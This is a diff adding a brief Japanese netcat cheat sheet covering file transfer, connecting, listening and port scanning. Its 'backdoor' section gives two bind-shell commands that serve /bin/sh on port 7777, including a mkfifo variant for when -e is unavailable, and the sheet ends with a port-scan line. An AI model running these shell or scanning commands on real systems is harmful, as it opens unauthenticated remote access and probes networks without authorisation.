@@ -1,0 +1,21 @@
+ファイル送信
+	送信側: cat file | nc -l PORT
+	受信側: nc SERVERNAME PORT > file
+		または、
+	受信側: nc -l PORT > file
+	送信側: cat file | nc SERVERNAME PORT
+
+telnet
+	nc SERVERNAME PORT
+
+待受 (listen)
+	nc -l -p PORT
+	-u: UTP
+
+バックドア
+	nc -l -p 7777 -e /bin/sh
+	(-eは最近は有効になっていないことが多い)
+	mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 7777 > /tmp/f
+
+Portscan
+	nc -z SERVER 10-1000
